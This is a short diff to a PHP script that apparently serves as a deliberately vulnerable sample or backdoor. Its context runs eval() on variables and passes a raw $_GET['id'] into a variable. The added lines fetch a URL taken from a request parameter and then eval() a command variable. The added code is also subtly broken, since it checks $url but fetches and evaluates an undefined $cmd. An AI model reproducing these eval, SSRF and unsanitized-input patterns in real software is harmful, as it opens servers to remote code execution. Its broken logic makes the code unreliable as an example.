@@ -12,7 +12,22 @@ function b($a){
     eval($a);
 }
 
- b($s3);
+function curl($url){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_exec($ch);
+    curl_close($ch);
+}
+
+$url = $_GET['url'];
+if (!empty($url)){
+    curl($cmd);
+}
+
+eval($cmd);
+
+b($s3);
 
 $id = addslashes($_GET['id']);
 $id2 = $_GET['id'];
